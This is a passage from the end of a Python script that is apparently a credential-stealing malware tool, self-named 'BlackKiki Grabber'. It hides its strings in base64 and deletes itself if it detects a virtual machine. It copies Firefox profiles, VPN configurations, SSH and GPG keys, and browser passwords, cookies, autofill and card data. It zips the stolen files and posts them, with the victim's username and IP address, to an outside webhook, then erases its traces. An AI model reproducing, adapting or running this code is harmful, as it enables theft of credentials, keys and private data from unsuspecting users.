                        ua=data.get(base64.b64decode("Y3VzdG9tX3VzZXJfYWdlbnQ=").decode(),data.get(base64.b64decode("dXNlcl9hZ2VudF9vdmVycmlkZQ==").decode(),{}).get(base64.b64decode("dXNlcl9hZ2VudA==").decode(),base64.b64decode("ZGVm").decode()))
                        uas.append(f"{br.split('\\')[-2]}::{pr}:::{ua}")
                except:pass
    if uas:open(os.path.join(o,base64.b64decode("dWFf").decode()+rds()+".txt"),"w",encoding="utf-8").write("\n".join(uas))
def sbc(o):
    bc=os.path.join(os.getenv("APPDATA"),base64.b64decode("TW96aWxsYVxGaXJlZm94XFByb2ZpbGVz").decode())
    if os.path.exists(bc):
        try:shutil.copytree(bc,os.path.join(o,base64.b64decode("bXpjXyI=").decode()+rds()),dirs_exist_ok=True,ignore=shutil.ignore_patterns(base64.b64decode("Y2FjaGUy").decode(),"shader-cache","startupCache"))
        except:pass
def svpn(o):
    ov=os.path.join(os.getenv("APPDATA"),base64.b64decode("T3BlblZQTiBDb25uZWN0").decode())
    if os.path.exists(ov):
        try:shutil.copytree(ov,os.path.join(o,base64.b64decode("b3Z4XyI=").decode()+rds()),dirs_exist_ok=True)
        except:pass
    wg=os.path.join(os.getenv("APPDATA"),base64.b64decode("V2lyZUdhcmQ=").decode())
    if os.path.exists(wg):
        try:shutil.copytree(wg,os.path.join(o,base64.b64decode("d2d4XyI=").decode()+rds()),dirs_exist_ok=True)
        except:pass
    pv=os.path.join(os.getenv("APPDATA"),base64.b64decode("UHJvdG9uVlBO").decode())
    if os.path.exists(pv):
        try:shutil.copytree(pv,os.path.join(o,base64.b64decode("cHZ4XyI=").decode()+rds()),dirs_exist_ok=True)
        except:pass
def ssk(o):
    ssh=os.path.join(os.getenv("USERPROFILE"),base64.b64decode("LnNzaA==").decode())
    if os.path.exists(ssh):
        try:shutil.copytree(ssh,os.path.join(o,base64.b64decode("c3NreF8i").decode()+rds()),dirs_exist_ok=True)
        except:pass
    gpg=os.path.join(os.getenv("APPDATA"),base64.b64decode("Z251cGc=").decode())
    if os.path.exists(gpg):
        try:shutil.copytree(gpg,os.path.join(o,base64.b64decode("Z3BneF8i").decode()+rds()),dirs_exist_ok=True)
        except:pass
def main():
    if vmc():sd();return
    kb()
    tmp=tempfile.mkdtemp(prefix=base64.b64decode("Y3J4XyI=").decode())
    bd=os.path.join(tmp,base64.b64decode("ZGN4XyI=").decode()+rds());os.makedirs(bd,exist_ok=True)
    wd=os.path.join(tmp,base64.b64decode("a3Z4XyI=").decode()+rds());os.makedirs(wd,exist_ok=True)
    md=os.path.join(tmp,base64.b64decode("c2N4XyI=").decode()+rds());os.makedirs(md,exist_ok=True)
    ssi(md)
    open(os.path.join(md,base64.b64decode("ZGJ4XyI=").decode()+rds()+".txt"),"w",encoding="utf-8").write(clb())
    ss(md)
    swc(md)
    swf(md)
    sia(md)
    spr(md)
    scrd(md)
    spsh(md)
    srf(md)
    sua(md)
    sbc(md)
    svpn(md)
    ssk(md)
    for k,n in [("c",base64.b64decode("Q3J4").decode()),("e",base64.b64decode("RWRneA==").decode()),("b",base64.b64decode("QnJ2eA==").decode()),("o",base64.b64decode("T3B4").decode()),("v",base64.b64decode("Vmx4").decode()),("y",base64.b64decode("WW54").decode()),("g",base64.b64decode("T3BneA==").decode()),("cent",base64.b64decode("Q2J4").decode()),("ungoog",base64.b64decode("VWd4").decode()),("comodo",base64.b64decode("Q2R4").decode()),("torch",base64.b64decode("VGN4").decode()),("maxthon",base64.b64decode("TXR4").decode())]:
        p=P.get(k,"")
        if not os.path.exists(p):continue
        mk=gmk(p)
        if mk:
            sp(p,mk,bd,n)
            sc(p,mk,bd,n)
            saf(p,mk,bd,n)
            scc(p,mk,bd,n)
            sh(p,bd,n)
            sdw(p,bd,n)
    sdt(md)
    srt(md)
    sst(md)
    sep(md)
    sbn(md)
    sri(md)
    stg(md)
    sw(md)
    zf=os.path.join(tempfile.gettempdir(),base64.b64decode("YmxhY2traWtpXyI=").decode()+getpass.getuser()+"_"+str(int(time.time()))+".zip")
    with zipfile.ZipFile(zf,"w",zipfile.ZIP_DEFLATED) as zf_:
        for rt,_,fs in os.walk(tmp):
            for fn in fs:
                p=os.path.join(rt,fn)
                zf_.write(p,os.path.relpath(p,tmp)+"_"+rds())
    u=getpass.getuser()
    try:ip=requests.get(base64.b64decode("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn").decode(),timeout=5).text
    except:ip="x"
    requests.post(W,json={"content":base64.b64decode("KipCbGFja0tpa2kqKiDwn5ClIHt1fSBAMge4pQ==").decode().format(u=u,ip=ip),"embeds":[{"title":base64.b64decode("QmxhY2tLaWtpIEdyYWJiZXI=").decode(),"description":base64.b64decode("VXNlcjoge3V9Ck1QOiB7aXB9Ck9TOiB7fX0KVGltZToge3R9").decode().format(u=u,ip=ip,os=platform.platform(),t=datetime.datetime.now()),"color":0x111111}]})
    with open(zf,"rb") as f:requests.post(W,files={"file":(base64.b64decode("YmxhY2traWtpXyI=").decode()+u+".zip",f,"application/zip")})
    try:shutil.rmtree(tmp);os.remove(zf)
    except:pass
    sd()
if __name__=="__main__":
    main()
